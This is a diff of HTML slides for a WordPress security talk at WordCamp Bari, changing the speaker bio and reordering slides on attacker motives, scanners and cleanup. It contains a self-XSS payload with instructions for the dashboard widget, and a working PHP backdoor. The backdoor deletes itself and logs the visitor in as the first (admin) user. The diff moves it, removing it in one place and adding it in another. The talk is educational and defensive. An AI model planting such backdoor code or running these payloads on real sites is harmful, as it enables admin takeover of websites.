@@ -30,7 +30,7 @@
 
 	<body>
 		<div class="barra"><div class="titolo"></div><div class="logo"></div></div>
-		<div class="barra bottom"><div class="titolo">Daniele Scasciafratte - WP Teramo</div><div class="hashtag">@wpteramo</div></div>
+		<div class="barra bottom"><div class="titolo">Daniele Scasciafratte - WordCamp Bari</div><div class="hashtag">#wcbari</div></div>
 		<div class="reveal">
 
 			<div class="slides">
@@ -49,10 +49,9 @@
 							<li>Co Founder/CTO Codeat</li>
 							<li>Open Source Addicted</li>
 							<li>WordPress Core Contributor/Developer</li>	
-							<li>ClassicPress Founding Committee</li>						
+							<li>ClassicPress i18n lead & Founding Committee</li>						
 							<li>WordPress Rome/Terni meetup</li>
 							<li>Mozillian & Mozilla Reps & Mozilla TechSpeaker</li>
-							<li>Industria Italiana Software Libero Presidente</li>
 						</ul>
 					</div>
 				</section>
@@ -84,19 +83,14 @@
 				</section>
 
 				<section>
-					<h3>Hackers are professionals</h3>
+					<h3>Hackers are professionals people</h3>
 					<img src="pictures/lamer.gif" class="full">
 				</section>
 
-				<section>
-					<h3>We are the Angela's of IT</h3>
-					<img src="pictures/sparatagrossa.gif" class="full">
-				</section>
-
 				<section class="force-bottom">
-					<img src="pictures/noncredo.gif" class="full">
-					<div class="background fragment">
-						<h3 class="white-black-shadow">Serious time!</h3>
+					<img src="pictures/sparatagrossa.gif" class="full">
+					<div class="background">
+						<h3 class="white-black-shadow">We are the Angela's of IT</h3>
 						<p>
 							An Hacker want to explain how he/she achieved the results to improve the technology but also itself and the others.
 						</p>
@@ -168,7 +162,7 @@
 									<li>Generate DDOS</li>
 									<li>Actions for logged/non users</li>
 									<li>Missing <b>nonce</b>s or <a href="https://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/">wrongly integrated</a></li>
-									<li>Abuse this calls (100000+ installation plugin <a href="https://www.wordfence.com/blog/2018/11/trends-following-vulnerability-in-wp-gdpr-compliance-plugin/">example</a>, <a href="https://blog.sucuri.net/2018/11/hackers-change-wordpress-siteurl-to-pastebin.html">example</a>)</li>
+									<li>Abuse this calls (<a href="https://www.wordfence.com/blog/2018/11/trends-following-vulnerability-in-wp-gdpr-compliance-plugin/">example</a>, <a href="https://blog.sucuri.net/2018/11/hackers-change-wordpress-siteurl-to-pastebin.html">example</a>, <a href="https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/">example</a>)</li>
 								</ul>
 							</li>
 							<li class="fragment">Look for premium plugins not updated</li>
@@ -180,9 +174,9 @@
 				
 				<section>
 					<h3>Let's try a SELF-XSS</h3>
-					<pre><code data-trim>">'>< details open ontoggle=confirm(1) ></code></pre>
-					<p>WordPress Events and News, click on the pencil and try this code.</p>
-					<b>@Evaristegal0is - https://twitter.com/evaristegal0is</b>
+					<pre><code data-trim>">'>< details open ontoggle=confirm(1)></code></pre>
+					<p>"WordPress Events and News" (dashboard widget), click on the pencil icon and try this code (without the space before <i>details</i> HTML tag).</p>
+					<b>@Evaristegal0is - <a href="https://twitter.com/evaristegal0is">https://twitter.com/evaristegal0is</a></b>
 				</section>
 
 				<section>
@@ -241,7 +235,7 @@ wpscan --url www.example.com --enumerate
 				<section>
 					<h2>WPSeku</h2>
 					<ul>
-						<li class="fragment">Rewritten WPScan in Python</li>
+						<li>Rewritten WPScan in Python</li>
 						<li class="fragment">Focus on plugin code (if in wp.org repo)
 							<ul>
 								<li>For XSS</li>
@@ -258,37 +252,9 @@ wpscan --url www.example.com --enumerate
 				</section>
 
 				<section>
-					<h2>Cool stuff</h2>
 					<img src="pictures/tapiro.jpg">
 				</section>
-
-				<section>
-					<h2>Backdoor</h2>
-					<pre><code data-trim>
-@unlink(__FILE__);
-
-require('../../../wp-blog-header.php');
-require('../../../wp-includes/pluggable.php');
-$user_info = get_userdata(1);
-// Automatic login //
-$username = $user_info->user_login;
-$user = get_user_by('login', $username );
-// Redirect URL //
-if ( !is_wp_error( $user ) )
-{
-    wp_clear_auth_cookie();
-    wp_set_current_user ( $user->ID );
-    wp_set_auth_cookie  ( $user->ID );
-
-    $redirect_to = user_admin_url();
-    wp_safe_redirect( $redirect_to );
-
-    exit();
-}
-					</code></pre>
-					<p><a href="https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php">https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php</a></p>
-				</section>
-
+				
 				<section>
 					<h2>Fix an hacked website</h2>
 					<ul>
@@ -314,7 +280,9 @@ if ( !is_wp_error( $user ) )
 				<section>
 					<h2>Why I want to hack your website?</h2>
 					<ul>
+						<li class="fragment">Access to Server Resources (mining)</li>
 						<li class="fragment">Ransom (data, files, domain, server)</li>
+						<li class="fragment">Malware (server, visitors)</li>
 						<li class="fragment">Scam
 							<ul>
 								<li>Redirects</li>
@@ -322,12 +290,36 @@ if ( !is_wp_error( $user ) )
 							</ul>
 						</li>
 						<li class="fragment">Phishing</li>
-						<li class="fragment">Malware (server, visitors)</li>
-						<li class="fragment">Access to Server Resources (mining)</li>
 						<li class="fragment">SPAM</li>
 						<li class="fragment">Other services in the server</li>
 						<li class="fragment">Fun</li>
 					</ul>
+				</section>
+
+				<section>
+					<h2>Backdoor</h2>
+					<pre><code data-trim>
+@unlink(__FILE__);
+
+require('../../../wp-blog-header.php');
+require('../../../wp-includes/pluggable.php');
+$user_info = get_userdata(1);
+// Automatic login //
+$username = $user_info->user_login;
+$user = get_user_by('login', $username );
+// Redirect URL //
+if ( !is_wp_error( $user ) )
+{
+    wp_clear_auth_cookie();
+    wp_set_current_user ( $user->ID );
+    wp_set_auth_cookie  ( $user->ID );
+
+    $redirect_to = user_admin_url();
+    wp_safe_redirect( $redirect_to );
+    exit();
+}
+					</code></pre>
+					<small><a href="https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php">https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php</a></small>
 				</section>
 
 				<section>
